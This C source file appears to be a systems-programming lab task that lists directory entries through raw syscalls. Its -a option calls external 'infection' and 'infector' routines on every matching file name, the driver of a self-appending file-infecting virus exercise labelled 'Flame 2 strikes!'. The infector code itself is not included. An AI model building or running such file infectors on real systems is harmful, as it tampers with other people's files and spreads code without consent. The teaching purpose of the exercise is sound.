#include "util.h"

/* fcntl.h - File flags */
/* dirent.h - Directory entity type (DT_TYPE) */

#define NULL 0

/* --------------------------- */
/* ---------- FILES ---------- */
/* --------------------------- */
typedef int FILE;

#define stdin  0
#define stdout 1
#define stderr 2

#define O_RDONLY	00000000
#define O_WRONLY	00000001
#define O_RDWR		00000002
#define O_CREAT		00000100
#define O_TRUNC		00001000
#define O_DIRECTORY	00200000

#define F_MODE_ALL 0777

/* ---------------------------------- */
/* ---------- SYSTEM CALLS ---------- */
/* ---------------------------------- */
#define SYS_EXIT  1
#define SYS_READ  3
#define SYS_WRITE 4
#define SYS_OPEN  5
#define SYS_CLOSE 6

typedef unsigned long SYS_CALL_ARG;
typedef int (*SYS_CALL_FUNC)(int cid, SYS_CALL_ARG arg0, SYS_CALL_ARG arg1, SYS_CALL_ARG arg2);
extern int system_call(int cid, SYS_CALL_ARG arg0, SYS_CALL_ARG arg1, SYS_CALL_ARG arg2);
SYS_CALL_FUNC sys_call = system_call;

int read(FILE f, void *buf, int len) {
    return sys_call(SYS_READ, f, (SYS_CALL_ARG)buf, len);
}

int write(FILE f, void *buf, SYS_CALL_ARG len) {
    return sys_call(SYS_WRITE, f, (SYS_CALL_ARG)buf, len);
}

FILE open(const char *file_name, int flags, int mode) {
    return sys_call(SYS_OPEN, (SYS_CALL_ARG)file_name, flags, mode);
}

int close(FILE f) {
    int ret = -1;
    if (f != stdin && f != stdout && f != stderr) {
        ret = sys_call(SYS_CLOSE, f, 0, 0);
    }

    return ret;
}

int read_c(FILE f, char *c) {
    return read(f, c, 1);
}

int write_c(FILE f, char c) {
    return write(f, &c, 1);
}
int write_s(FILE f, char *s) {
    return write(f, s, strlen(s));
}
int write_num(FILE f, int n) {
    char *s = itoa(n);
    return write_s(f, s);
}
int write_line(FILE f) {
    return write_c(f, '\n');
}

/* --------------------------------- */
/* ---------- DEBUG STUFF ---------- */
/* --------------------------------- */
#define dbg_out stderr
int DebugMode = 0;

void dbg_print(void *buf, SYS_CALL_ARG len) {
    system_call(SYS_WRITE, dbg_out, (SYS_CALL_ARG)buf, len);
}
void dbg_print_c(char c) {
    dbg_print(&c, 1);
}
void dbg_print_s(char *s) {
    dbg_print(s, strlen(s));
}
void dbg_print_num(int n) {
    char *s = itoa(n);
    dbg_print_s(s);
}
void dbg_print_line() {
    dbg_print_c('\n');
}

void dbg_print_syscall_info(int cid, SYS_CALL_ARG arg0, SYS_CALL_ARG arg1, SYS_CALL_ARG arg2, int ret) {
    dbg_print_s("SYS_CALL: ");
    dbg_print_s("cid=");
    dbg_print_num(cid);
    dbg_print_s(", arg0=");
    dbg_print_num(arg0);
    dbg_print_s(", arg1=");
    dbg_print_num(arg1);
    dbg_print_s(", arg2=");
    dbg_print_num(arg2);
    dbg_print_s(", ret=");
    dbg_print_num(ret);
    dbg_print_line();
}
int dbg_sys_call(int cid, SYS_CALL_ARG arg0, SYS_CALL_ARG arg1, SYS_CALL_ARG arg2) {
    int ret = system_call(cid, arg0, arg1, arg2);
    dbg_print_syscall_info(cid, arg0, arg1, arg2, ret);
    return ret;
}

/* -------------------------------- */
/* ---------- BEGIN TASK ---------- */
/* -------------------------------- */
#define ERROR_CODE 0x55
#define SYS_GETDENTS 141
#define ARR_LEN(a) (sizeof((a)) / sizeof(*(a)))

#define DT_UNKNOWN 0
#define DT_FIFO    1
#define DT_CHR     2
#define DT_DIR     4
#define DT_BLK     6
#define DT_REG     8
#define DT_LNK     10
#define DT_SOCK    12
#define DT_WHT     14

typedef struct linux_dirent {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char           d_name[];
} linux_dirent;
char linux_dirent_get_d_type(linux_dirent *d) {
    return *((char *)d + d->d_reclen - 1);
}

int getdents(FILE f, linux_dirent *dirp, int count) {
    return sys_call(SYS_GETDENTS, f, (SYS_CALL_ARG)dirp, count);
}

char* get_dirent_type_name(char d_type) {
    return (d_type == DT_UNKNOWN) ? "Unkown" :
           (d_type == DT_REG)     ? "regular" :
           (d_type == DT_DIR)     ? "directory" :
           (d_type == DT_FIFO)    ? "FIFO" :
           (d_type == DT_SOCK)    ? "socket" :
           (d_type == DT_LNK)     ? "symlink" :
           (d_type == DT_BLK)     ? "block dev" :
           (d_type == DT_CHR)     ? "char dev" :
           "???";
}

extern void code_start(void);
extern void code_end(void);

extern void infection(void);
extern void infector(char *file_name);

int print_file_dirs_of_fd(FILE f_out, FILE fd, char *prefix, int append) {
    int err = 0;
    char buf[8192];
    int nread = 0;
    int bpos = 0;
    linux_dirent *d = NULL;
    int prefix_len = 0;
    if (prefix) {
        prefix_len = strlen(prefix);
    }

    while (1) {
        nread = getdents(fd, (linux_dirent *)buf, ARR_LEN(buf));
        if (nread < 0) {
            /* ERROR */
            err = 3;
            break;
        }

        if (nread == 0) {
            /* END OF DIR */
            break;
        }

        for (bpos = 0; bpos < nread; bpos += d->d_reclen) {
            char d_type = DT_UNKNOWN;
            int selected = 0;
            d = (linux_dirent *)(buf + bpos);
            d_type = linux_dirent_get_d_type(d);
            if (!prefix || strncmp(prefix, d->d_name, prefix_len) == 0) {
                write_s(f_out, d->d_name);
                write_s(f_out, ", ");
                write_s(f_out, get_dirent_type_name(d_type));
                selected = 1;
            }
            if (DebugMode) {
                dbg_print_s("dirent length=");
                dbg_print_num(d->d_reclen);
                dbg_print_s(", name='");
                dbg_print_s(d->d_name);
                dbg_print_s("'");
            }

            if (DebugMode && !selected) {
                dbg_print_line();
            }
            else if (DebugMode || selected) {
                write_line(f_out);
            }

            if (!selected) {
                continue;
            }

            if (append) {
                infection();
                infector(d->d_name);
            }
        }
    }

    return err;
}

int print_file_dirs_of_dir(FILE f_out, char *dir, char *prefix, int append) {
    int err = 0;
    FILE fd = open(dir, O_DIRECTORY | O_RDONLY, 0);
    if (fd < 0) {
        write_s(f_out, "Could not open the directory '");
        write_s(f_out, dir);
        write_s(f_out, " ' for reading");
        write_line(f_out);
        err = fd;
    }
    else {
        err = print_file_dirs_of_fd(f_out, fd, prefix, append);
        close(fd);
    }

    return err;
}

void print_code_labels_addr(FILE f_out) {
    write_s(f_out, "code start: ");
    write_num(f_out, (int)code_start);
    write_line(f_out);

    write_s(f_out, "code end: ");
    write_num(f_out, (int)code_end);
    write_line(f_out);
}

int main (int argc , char* argv[], char* envp[]) {
    int exit_code = 0;
    FILE f_in = stdin, f_out = stdout;

    int append = 0;
    char *prefix = NULL;

    int i = 0;
    for (i = 0; i < argc; ++i) {
        if (strncmp("-D", argv[i], 2) == 0) {
            DebugMode = 1;
            sys_call = dbg_sys_call;
            break;
        }
    }

    for (i = 0; i < argc; ++i) {
        if (strncmp("-p", argv[i], 2) == 0) {
            if (prefix) {
                write_s(f_out, "Cannot use both '-a' and '-p'");
                exit_code = 1;
                break;
            }
            else {
                prefix = argv[i] + 2;
            }
        }
        else if (strncmp("-a", argv[i], 2) == 0) {
            if (prefix) {
                write_s(f_out, "Cannot use both '-a' and '-p'");
                exit_code = 2;
                break;
            }
            else {
                prefix = argv[i] + 2;
                append = 1;
            }
        }
    }

    write_s(f_out, "Flame 2 strikes!\n");
    print_code_labels_addr(f_out);
    if (exit_code == 0) {
        exit_code = print_file_dirs_of_dir(f_out, ".", prefix, append);
    }
    if (exit_code != 0) {
        exit_code = ERROR_CODE;
    }

    close(f_in);
    close(f_out);
    close(dbg_out);
    return exit_code;
}
